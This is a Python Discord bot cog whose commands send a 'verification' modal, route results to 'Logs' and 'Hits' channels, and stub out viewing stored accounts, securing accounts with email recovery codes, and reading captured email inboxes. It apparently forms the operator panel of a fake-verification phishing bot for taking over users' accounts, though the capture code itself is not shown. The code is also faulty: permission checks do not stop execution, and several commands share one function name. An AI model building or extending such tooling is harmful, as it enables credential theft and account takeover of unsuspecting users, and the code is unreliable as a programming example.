import json
import discord

from discord import app_commands
from discord.ext import commands

from views.modals.modal_three import MyModalThree

owners = json.load(open("config.json", "r+"))["owners"]

class MyCog(commands.Cog):
    def __init__(self,  bot):
        self.bot = bot

    @app_commands.command(name="send_embed", description="Sends the verification embed")
    async def verificationEmbed(self, interaction: discord.Interaction):
        if interaction.user.id not in owners:
            await interaction.response.send_message(
                "You do not have permission to execute this command!", 
                ephemeral=True
            )

        config = json.load(open("config.json", "r+"))
        
        if not config["discord"]["logs_channel"] or not config["discord"]["accounts_channel"]:
            await interaction.response.send_message(
                "You must set the Logs and Hits channel first with /set_channel!", 
                ephemeral = True 
            )
            
            return
        
        await interaction.response.send_modal(MyModalThree())
        await interaction.response.send_message(
            "Embed sent!",
            ephemeral = True
        )

    @app_commands.command(name="set_channel", description="Sets your channel IDs")
    @app_commands.choices(
        choice=[
            app_commands.Choice(name="Logs", value="logs_channel"),
            app_commands.Choice(name="Hits", value="accounts_channel"),
        ]
    )
    async def setChannels(self, interaction: discord.Interaction, choice: app_commands.Choice[str]):
        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        with open("config.json", "r+") as config:

            newConfig = json.load(config)

            match choice.value:
                case "logs_channel":
                    newConfig["discord"]["logs_channel"] = int(interaction.channel_id)
                case "accounts_channel":
                    newConfig["discord"]["accounts_channel"] = int(interaction.channel_id)

            config.seek(0)
            json.dump(newConfig, config, indent=4)

        await interaction.response.send_message(f"Sucessfully set {choice.name} channel!", ephemeral=True)

    @app_commands.command(name="secure", description="Automaticly secures your account")
    async def secure(self, interaction: discord.Interaction, email: str, recoveryCode: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    @app_commands.command(name="account", description="Shows you all stored accounts")
    async def secure(self, interaction: discord.Interaction):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    @app_commands.command(name="email", description="Shows the inbox of your email stored in donarev")
    async def secure(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

async def setup(bot):
    await bot.add_cog(MyCog(bot))
